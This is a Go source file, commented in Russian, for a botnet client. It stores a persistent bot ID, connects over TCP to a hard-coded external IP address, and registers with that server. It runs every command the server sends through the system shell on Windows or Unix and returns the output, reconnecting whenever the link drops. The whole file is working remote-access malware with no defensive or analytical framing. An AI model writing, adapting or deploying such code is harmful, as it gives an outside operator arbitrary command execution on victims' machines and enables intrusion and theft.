package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/google/uuid"
)

const (
	serverAddr = "37.46.230.242:8080" // Заменили localhost на внешний IP
	idFile     = "bot_id.txt"
)

// Определяем интерпретатор команд в зависимости от ОС
func getShellAndFlag() (string, string) {
	if runtime.GOOS == "windows" {
		return "cmd", "/C"
	}
	return "sh", "-c"
}

// Генерация или загрузка уникального ID бота
func getOrCreateBotID() string {
	if _, err := os.Stat(idFile); err == nil {
		data, err := os.ReadFile(idFile)
		if err != nil {
			log.Fatal("Ошибка чтения bot_id.txt:", err)
		}
		return strings.TrimSpace(string(data))
	}

	newID := uuid.New().String()
	err := os.WriteFile(idFile, []byte(newID), 0644)
	if err != nil {
		log.Fatal("Ошибка сохранения bot_id.txt:", err)
	}
	return newID
}

// Выполняем команду и возвращаем результат
func executeCommand(cmdStr string) string {
	shell, flag := getShellAndFlag()
	cmd := exec.Command(shell, flag, cmdStr)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Ошибка: %s", err)
	}
	return string(output)
}

func main() {
	botID := getOrCreateBotID()

	for {
		log.Println("Подключение к серверу:", serverAddr)
		conn, err := net.Dial("tcp", serverAddr)
		if err != nil {
			log.Println("❌ Ошибка подключения:", err)
			time.Sleep(5 * time.Second) // Ждём 5 сек перед новой попыткой
			continue
		}
		log.Println("✅ Подключение успешно!")
		defer conn.Close()

		// Отправляем регистрацию
		reg := map[string]string{"type": "register", "bot_id": botID}
		data, _ := json.Marshal(reg)
		conn.Write(append(data, '\n'))

		// Читаем команды
		reader := bufio.NewReader(conn)
		for {
			msg, err := reader.ReadString('\n')
			if err != nil {
				log.Println("⚠️ Отключение от сервера, переподключение...")
				break
			}

			var cmd map[string]string
			err = json.Unmarshal([]byte(msg), &cmd)
			if err == nil && cmd["type"] == "command" {
				log.Println("📩 Получена команда:", cmd["command"])
				result := executeCommand(cmd["command"])

				resp := map[string]string{
					"type":    "response",
					"bot_id":  botID,
					"command": cmd["command"],
					"result":  result,
				}
				data, _ := json.Marshal(resp)
				conn.Write(append(data, '\n'))
			}
		}

		// Ждём перед повторной попыткой подключения
		time.Sleep(5 * time.Second)
	}
}
